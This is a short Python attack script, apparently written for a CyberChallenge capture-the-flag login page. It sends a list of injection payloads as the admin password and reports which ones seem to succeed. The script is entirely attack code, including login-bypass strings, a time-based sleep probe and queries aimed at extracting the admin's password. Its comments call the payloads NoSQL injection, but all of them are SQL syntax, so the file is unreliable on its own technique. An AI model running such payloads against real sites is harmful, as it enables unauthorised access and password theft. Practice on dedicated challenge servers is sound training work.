import requests

# URL della pagina di login
url = "http://nosql.challs.cyberchallenge.it/login.php"

# Username fisso
username = "admin"

# Lista di payload per testare NoSQL Injection
payloads = [
    "' OR '1'='1",  # Bypass login SQL standard
    "' OR 'a'='a",  # Variante con lettere
    "' OR 1=1 --",  # Versione con commento SQL
    "' OR 1=1#",  # Variante con hash per MySQL
    "' OR sleep(5) --",  # Test di iniezione basata sul tempo
    "' OR exists(select * from users) --",  # Test per verificare la presenza della tabella utenti
    "' OR (SELECT COUNT(*) FROM users) > 0 --",  # Verifica se ci sono utenti registrati
    "' OR (SELECT LENGTH(password) FROM users WHERE username='admin') > 0 --",  # Verifica la lunghezza della password
    "' OR (SELECT password FROM users WHERE username='admin') --",  # Tentativo di estrarre la password
]

# Ciclo per testare i payloads
for payload in payloads:
    data = {
        'username': username,
        'password': payload  # Payload di injection
    }

    # Invio della richiesta
    response = requests.post(url, data=data)

    # Controllo se la risposta contiene "Error"
    if "Error" not in response.text:
        print(f"🔥 POSSIBILE SUCCESSO con payload: {payload}")
    else:
        print(f"❌ Fallito: {payload}")

    print(f"📏 Lunghezza della risposta: {len(response.text)}")
    print("-" * 60)
